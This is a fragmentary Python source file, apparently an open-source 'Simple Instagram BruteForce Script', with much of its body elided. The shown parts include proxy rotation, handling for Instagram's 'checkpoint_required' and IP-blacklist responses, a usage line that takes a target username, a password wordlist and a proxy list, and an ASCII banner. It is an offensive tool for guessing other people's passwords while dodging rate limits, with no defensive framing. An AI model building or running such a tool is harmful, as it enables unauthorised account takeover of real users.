# coding=utf-8
#####>-------------------------------------------------------------------------
# Simple Instagram BruteForce Script
# Developed By Nabil Et-taqy
# Github: https://github.com/HackAndDrift
# Gitlab: https://gitlab.com/LinuxCommand
# !/usr/bin/python
#####>-------------------------------------------------------------------------
            ...
            if e.getcode() == 400 or e.getcode() == 403:
                if e.read().decode("utf8", 'ignore').find('"checkpoint_required"') != -1:
                    ...
                    print(bcolors.WARNING +
                          "(!)Error: Proxy IP %s is now blacklisted !" % (proxy,)
                          + bcolors.ENDC
                          )
                    ...
                    print(bcolors.FAIL + "(!)Error : Your Ip is now blacklisted ,"
...
def starter():
    ...
    try:
        ...
        print("(!) Bruteforce completed !" + bcolors.ENDC)
...
if __name__ == "__main__":
    ...
    parser = argparse.ArgumentParser(
        description="Simple Instagram BruteForce Script",
        epilog="python instagram.py -u user_test -w words.txt -p proxys.txt -t 4 -d -v"
    )
    ...
    print(""".-------------------------------------------------------.""")
    print("""|    888888ba  dP        dP    dP  .d888888  d888888P   |""")
    print("""|    88    `8b 88        Y8.  .8P d8'    88     88      |""")
    print("""|   a88aaaa8P' 88         Y8aa8P  88aaaaa88a    88      |""")
    print("""|    88   `8b. 88           88    88     88     88      |""")
    print("""|    88    .88 88           88    88     88     88      |""")
    print("""|    88888888P 88888888P    dP    88     88     dP      |""")
    print("""|         /Simple instagram bruteforce Script\          |""")
    print("""|                   (by Nabil Et-taqy)                  |""")
    print("""'-------------------------------------------------------'""")
